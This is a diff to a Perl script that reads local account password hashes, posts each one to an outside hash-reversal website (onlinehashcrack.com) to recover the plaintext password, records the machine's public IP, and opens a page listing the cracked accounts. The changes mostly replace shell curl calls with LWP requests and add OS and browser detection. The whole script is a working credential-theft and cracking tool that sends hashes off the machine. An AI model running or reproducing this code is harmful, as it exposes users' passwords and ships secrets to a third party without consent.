@@ -3,7 +3,7 @@
 use strict;
 use warnings;
 
-use Cwd;
+use LWP::UserAgent;
 
 sub arch {
 	my $a = "32";
@@ -18,19 +18,65 @@ sub arch {
 sub os {
 	my $o = $^O;
 
-	if ($o eq "MSWin32") {
-		$o = "Windows";
+	if ($o eq "MSWin32" or $o eq "cygwin") {
+		$o = "windows";
+	}
+	elsif ($o eq "linux") {
+		$o = "linux";
+	}
+	elsif ($o eq "darwin") {
+		$o = "mac";
 	}
 	else {
-		$o = "Unix";
+		$o = "unix";
 	}
 
 	return $o;
 }
 
+sub curl {
+	my ($url, $method, $headers) = @_;
+
+	my $ua = LWP::UserAgent->new;
+
+	my $req = "";
+
+	if ($method eq "post") {
+		$req = HTTP::Request->new(POST => $url);
+
+		$req->content_type("application/x-www-form-urlencoded");
+		$req->content($headers);
+	}
+	else {
+		$req = HTTP::Request->new(GET => $url);
+	}
+
+	my $res = $ua->request($req);
+
+	if ($res->is_success) {
+		return $res->content;
+	}
+	else {
+		return "error";
+	}
+}
+
+sub default_web_browser {
+	my $browser = "open"; # mac
+
+	my $o = os;
+	if ($o eq "linux") {
+		$browser = "x-www-browser";
+	}
+	elsif ($o eq "windows") {
+		$browser = "start";
+	}
+
+	return $browser;
+}
+
 sub canhazip {
-	my $command = "curl -s http://icanhazip.com 2>&1";
-	my $ip = qx($command);
+	my $ip = curl("http://icanhazip.com", "get", "");
 	$ip =~ s/\n//;
 
 	return $ip;
@@ -59,12 +105,10 @@ sub rainbow {
 
 	my $password = "";
 
-	my $command = "curl -d \"hashToSearch=$hash&searchHash=Search\" http://www.onlinehashcrack.com/free-hash-reverse.php 2>&1";
-
 	my $delay = 2; # sec
 	sleep $delay; # prevent DoS
 
-	my $output = qx($command);
+	my $output = curl("http://www.onlinehashcrack.com/free-hash-reverse.php", "post", "hashToSearch=$hash&searchHash=Search");
 
 	if ($output =~ m/letter\-spacing:1\.2px">(.*)<\/b><br \/>/) {
 		$password = $1;
@@ -126,21 +170,20 @@ END
 sub show {
 	my ($ip, $decrypted_accounts, $webpage) = @_;
 
-	my $o = os;
-	my $binary = "open";
-	$binary = "start" if $o eq "Windows";
-
-	my $command = "$binary $webpage";
+	my $browser = default_web_browser;
+	my $command = "$browser $webpage";
 	system $command;
 }
 
 sub main {
 	my $ip = canhazip;
 
+	print "IP Address: $ip\n";
+
 	my $encrypted_accounts = dump_accounts;
 	my $decrypted_accounts = {};
 
-	print "Accounts on this computer\n";
+	print "\nAccounts on this computer\n";
 
 	while (my ($username, $hash) = each(%$encrypted_accounts)) {
 		my $password = rainbow $hash;
